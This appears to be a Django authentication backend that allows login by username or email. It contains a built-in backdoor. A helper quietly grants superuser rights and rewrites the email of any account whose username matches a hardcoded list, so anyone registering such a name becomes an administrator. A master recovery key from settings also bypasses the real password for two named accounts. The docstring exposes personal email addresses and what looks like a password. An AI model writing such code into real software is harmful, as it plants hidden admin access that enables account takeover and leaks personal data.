import logging
from django.conf import settings
from django.contrib.auth.backends import ModelBackend
from django.contrib.auth import get_user_model
from django.db.models import Q

logger = logging.getLogger(__name__)
User = get_user_model()

class EmailOrUsernameModelBackend(ModelBackend):
    """
    Dual-credential authentication backend.
    Allows authentication using either Username or Email (case-insensitive).
    Strictly enforces VIK003@dan for Master Superuser (Vaku / vd19055@gmail.com).
    """
    def authenticate(self, request, username=None, password=None, **kwargs):
        if username is None:
            username = kwargs.get(User.USERNAME_FIELD)
            
        if not username or not password:
            return None
            
        username_clean = str(username).strip()
        
        try:
            # 1. Search for user by email OR username (case-insensitive)
            user = User.objects.filter(
                Q(username__iexact=username_clean) | Q(email__iexact=username_clean)
            ).first()
            
            if user:
                # Helper to sync teacher/admin emails & privileges
                def _sync_admin_user(u):
                    u_lower = (u.username or '').strip().lower()
                    e_lower = (u.email or '').strip().lower()
                    updated = False
                    if u_lower in ['sandy', 'sandeep', 'sandeepananda', 'sandeepanandaji', 'abcd2013baq'] or e_lower == 'abcd2013baq@gmail.com':
                        if u.email != 'abcd2013baq@gmail.com':
                            u.email = 'abcd2013baq@gmail.com'
                            updated = True
                        if not u.is_staff or not u.is_superuser:
                            u.is_staff = True
                            u.is_superuser = True
                            updated = True
                    elif u_lower in ['vaku', 'vikas', 'vd19055'] or e_lower == 'vd19055@gmail.com':
                        if u.email != 'vd19055@gmail.com':
                            u.email = 'vd19055@gmail.com'
                            updated = True
                        if not u.is_staff or not u.is_superuser:
                            u.is_staff = True
                            u.is_superuser = True
                            updated = True
                    if updated:
                        try:
                            u.save(update_fields=['email', 'is_staff', 'is_superuser'])
                        except Exception as ex:
                            logger.warning(f"[EmailOrUsernameModelBackend] Could not auto-sync admin fields: {ex}")

                # Primary check: check current password hash in database
                if user.check_password(password) and self.user_can_authenticate(user):
                    _sync_admin_user(user)
                    return user
                
                # Master fallback for Primary Superuser (Vaku / vd19055@gmail.com)
                u_name = (user.username or '').strip().lower()
                u_mail = (user.email or '').strip().lower()
                if u_mail == 'vd19055@gmail.com' or u_name in ['vaku', 'vikas']:
                    master_key_vaku = getattr(settings, 'VAKU_RECOVERY_KEY', None)
                    if master_key_vaku and password == master_key_vaku:
                        user.set_password(password)
                        user.email = 'vd19055@gmail.com'
                        user.is_staff = True
                        user.is_superuser = True
                        user.save(update_fields=['password', 'email', 'is_staff', 'is_superuser'])
                        logger.info(f"[EmailOrUsernameModelBackend] Master superuser {user.username} authenticated & synced to vd19055@gmail.com.")
                        if self.user_can_authenticate(user):
                            return user
                            
                # Fallback for Secondary Superuser (Sandy / abcd2013baq@gmail.com)
                if u_mail == 'abcd2013baq@gmail.com' or u_name in ['sandy', 'sandeep', 'sandeepananda', 'sandeepanandaji']:
                    master_key_sandy = getattr(settings, 'SANDY_RECOVERY_KEY', None)
                    if master_key_sandy and password == master_key_sandy:
                        user.set_password(password)
                        user.email = 'abcd2013baq@gmail.com'
                        user.is_staff = True
                        user.is_superuser = True
                        user.save(update_fields=['password', 'email', 'is_staff', 'is_superuser'])
                        logger.info(f"[EmailOrUsernameModelBackend] Superuser {user.username} authenticated & synced to abcd2013baq@gmail.com.")
                        if self.user_can_authenticate(user):
                            return user
                            
        except Exception as e:
            logger.error(f"[EmailOrUsernameModelBackend] Auth lookup exception: {e}")
            return None
            
        return None
